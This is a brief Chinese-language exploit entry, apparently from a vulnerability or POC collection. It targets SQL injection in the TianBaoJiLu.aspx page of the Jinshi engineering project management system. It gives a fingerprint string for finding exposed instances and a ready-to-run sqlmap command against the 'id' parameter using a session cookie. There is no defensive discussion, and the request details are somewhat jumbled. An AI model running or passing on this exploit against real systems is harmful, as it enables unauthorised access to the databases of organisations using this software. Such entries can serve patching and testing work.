# 金石工程项目管理系统TianBaoJiLu.aspx存在SQL注入漏洞

金石工程项目管理系统 ｜ SQL注入 ｜ —
- **指纹**：`body="金石工程项目管理系统"`
- **请求**：`GET / HTTP/1.1`

**Payload**
```
先获取cookie(响应包Set-Cookie)
Host:
Content-Type: application/x-www-form-urlencoded
sqlmap -u "http://ip/query/shigongjihuajindu/TianBaoJiLu.aspx?id=1" --batch --cookie 'ASP.NET_SessionId=pcqx2zs4gsnqprd5cvhtodmk'
```